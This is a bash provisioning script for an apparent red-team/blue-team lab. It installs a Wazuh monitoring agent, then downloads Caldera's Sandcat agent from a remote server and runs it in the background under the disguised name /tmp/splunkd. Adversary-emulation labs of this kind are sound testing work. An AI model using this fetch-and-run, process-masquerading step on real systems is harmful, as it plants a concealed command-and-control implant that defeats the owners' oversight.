#!/bin/bash
# Target Agent provisioning script (Linux)
# Usage: sudo ./install_linux_agent.sh <WAZUH_SERVER_IP> <CALDERA_SERVER_IP>

WAZUH_IP=$1
CALDERA_IP=$2

if [ -z "$WAZUH_IP" ] || [ -z "$CALDERA_IP" ]; then
  echo "Error: Please provide the server IPs."
  echo "Usage: sudo ./install_linux_agent.sh 192.168.X.X 192.168.Y.Y"
  exit 1
fi

echo "[+] Installing Wazuh Blue Team Agent..."
# Downloads and installs the Wazuh key and repository (Version 4.x)
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
apt-get update

# Installs the agent pointing to the server
WAZUH_MANAGER="$WAZUH_IP" apt-get install wazuh-agent -y
systemctl daemon-reload
systemctl enable wazuh-agent
systemctl start wazuh-agent

echo "[+] Installing Caldera Red Team Agent (Sandcat)..."
server="http://${CALDERA_IP}:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/splunkd
chmod +x /tmp/splunkd
# Executes the agent in the background (masqueraded)
nohup /tmp/splunkd -server $server -group red > /dev/null 2>&1 &

echo "[✔] Provisioning completed successfully!"